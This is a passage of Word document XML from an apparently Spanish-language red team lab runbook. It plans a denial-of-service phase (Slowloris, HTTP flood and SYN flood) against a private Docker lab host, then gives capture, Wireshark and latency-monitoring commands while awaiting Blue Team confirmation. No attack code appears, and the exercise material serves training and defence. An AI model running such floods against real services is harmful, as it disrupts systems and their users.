        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve">Hora   </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve">  :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve"> HH:MM</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35FBA3AF" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>Técnica  :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>Slowloris</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve"> + HTTP </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>flood</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve"> + SYN </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>flood</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve"> secuenciales</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11C33BCE" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve">Target </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve">  :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve"> 172.20.0.20 (puerto 80)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09DA0F67" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>Duración :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve"> ~25 minutos incluyendo pausas</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D8D936D" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve">Señal </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>OK :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve"> Confirmar cuando estén monitoreando con Wireshark</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B5D6822" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="007C2578">
      <w:pPr>
        <w:spacing w:after="80"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1970A849" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:before="40" w:after="80"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>Esperar confirmación escrita del Blue Team antes de continuar.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11F4BA62" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="007C2578">
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="1F3564"/>
        </w:pBdr>
        <w:spacing w:after="80"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="749F0E7A" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Ttulo2"/>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:color w:val="1F3564"/>
          <w:sz w:val="24"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>Ejecutar — 3 terminales simultáneas</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14FB4619" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:b/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>Terminal 1 (PowerShell en el HOST) — Captura de paquetes</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06BCF697" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>cd C:\Project-Red-Team</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A4CB99A" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>bash observability/start-pcap.sh</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C790C02" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="007C2578">
      <w:pPr>
        <w:spacing w:after="80"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1ACE7202" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:before="40" w:after="80"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>Esto resuelve automáticamente el nombre del bridge de Docker (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="C00000"/>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>br</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="C00000"/>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>-XXXXXXXXXXXX</w:t>
      </w:r>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve">) e inicia </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="C00000"/>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>tcpdump</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve">. El </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve">archivo </w:t>
      </w:r>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="C00000"/>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="C00000"/>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>pcap</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve"> se guarda en </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="C00000"/>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>evidence</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="C00000"/>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="C00000"/>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>pcap</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="C00000"/>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>/capture-&lt;</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="C00000"/>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>timestamp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="C00000"/>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>&gt;.</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="C00000"/>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>pcap</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7CF882ED" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:before="40" w:after="80"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve">Para que el Blue Team abra el </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>pcap</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve"> en tiempo real con Wireshark:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64C3B3E2" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve"># Obtener el nombre del archivo </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>pcap</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve"> generado</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42D8D39F" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>cat</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve"> /</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>tmp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>lab</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>-</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>pcap</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>-file</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="133B5188" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t># Abrir en Wireshark (reemplazar con la ruta real)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65B38EEB" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>wireshark</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve"> evidence\</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>pcap</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>\capture-&lt;timestamp</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>&gt;.</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>pcap</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="347EB646" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="007C2578">
      <w:pPr>
        <w:spacing w:after="80"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7C235A4B" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:b/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>Terminal 2 (PowerShell) — Monitor de latencia en tiempo real</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="734BD84B" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">docker exec -it </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>redteam</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>-kali bash -c "</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3FB5A890" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">  LAB_TARGET=172.20.0.20 bash /root/scripts/phase-6-dos/99-monitor.sh</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="371064C5" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0AF6A5D9" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="007C2578">
      <w:pPr>
        <w:spacing w:after="80"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="334525DD" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:before="40" w:after="80"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve">Muestra una línea por segundo con </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="C00000"/>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>timestamp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="C00000"/>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve"> | </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="C00000"/>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>http_code</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="C00000"/>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve"> | </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
